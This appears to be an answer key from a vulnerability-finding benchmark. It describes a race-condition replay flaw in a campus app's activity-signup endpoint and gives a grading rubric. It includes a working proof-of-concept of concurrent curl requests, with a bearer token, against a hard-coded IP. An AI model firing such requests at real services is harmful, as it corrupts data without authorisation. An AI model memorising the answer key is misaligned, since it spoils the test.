# R03 — Ground Truth

**Type:** R2 — 重放攻击（Missing idempotency protection on signup endpoint）

**根因:** `campus_go/internal/handlers/activities.go` Signup 函数没有检测重复报名请求。同一用户在短时间内发送两个完全相同的 POST 请求，两个请求都会通过 `SELECT COUNT(*) < limit` 检查（因为第一个请求的 INSERT 还没完成），导致重复报名记录。

虽然有 UNIQUE 约束可以部分防御，但竞态窗口仍然存在（T1 类型bug）。从安全角度看，这是缺少 nonce/idempotency-key 导致的重放攻击面。

**利用证明:**
```bash
# 同时发送两个报名请求（使用 subshell 并发）
for i in 1 2; do
  curl -X POST -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"activity_id": 1}' \
    http://139.196.50.134/api/activities/1/signup &
done
wait

# 查询报名记录 → 同一用户同一活动出现 2 条记录
curl -H "Authorization: Bearer <token>" \
  http://139.196.50.134/api/activities/1/participants
# → [{"user_id": 5, "name": "学生A"}, {"user_id": 5, "name": "学生A"}] ← 重复
```

**评分要点:**
- 漏洞分类: R2 重放攻击 (1pt)
- 复现: 并发请求 → 重复记录 (1pt)
- 根因: 缺少 idempotency key + SELECT-INSERT 竞态窗口 (2pt)
- 攻击链: 重放 → 数据完整性破坏 → 活动超报 (1pt)
- 修复: 添加 idempotency key 或 UNIQUE 约束 + 应用层去重 (1pt)
- 防御建议: 所有写操作加幂等性保护 (1pt)
- 链完整 (1pt)
